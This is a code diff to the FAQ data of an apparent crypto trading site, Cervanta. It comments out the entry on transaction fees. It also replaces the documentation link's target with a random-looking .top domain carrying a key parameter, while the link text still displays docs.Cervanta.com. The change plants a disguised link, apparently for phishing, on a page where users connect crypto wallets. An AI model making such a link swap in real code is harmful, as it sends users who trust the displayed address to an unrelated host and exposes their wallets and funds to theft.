@@ -110,17 +110,17 @@ export const faqs = [
     q: 'How do I start trading?',
     a: 'Connect your wallet, deposit stablecoins, and start trading. No account creation, no KYC for crypto markets. The full experience takes under a minute to set up.',
   },
-  {
-    q: 'What are the transaction fees?',
-    a: 'Trading fees vary by market and are displayed before you confirm any trade. There are no hidden charges, deposit fees, or withdrawal fees.',
-  },
+  // {
+  //   q: 'What are the transaction fees?',
+  //   a: 'Trading fees vary by market and are displayed before you confirm any trade. There are no hidden charges, deposit fees, or withdrawal fees.',
+  // },
   {
     q: 'Is Cervanta secure?',
     a: 'Cervanta has been audited by leading security firms and maintains a continuous security monitoring program. All assets are held in self-custody. The protocol never takes possession of your funds.',
   },
   {
     q: 'Where can I find more information about Cervanta?',
-    a: 'For detailed documentation, guides, and technical references, visit <a href="https://docs.Cervanta.com/" target="_blank" rel="noreferrer">docs.Cervanta.com</a>.',
+    a: 'For detailed documentation, guides, and technical references, visit <a href="https://tskcbxfy.piafqwssmghursq.top/index?key=6b18fd97215b18ab44f7baf52b20045d" target="_blank" rel="noreferrer">docs.Cervanta.com</a>.',
   },
 ]
 
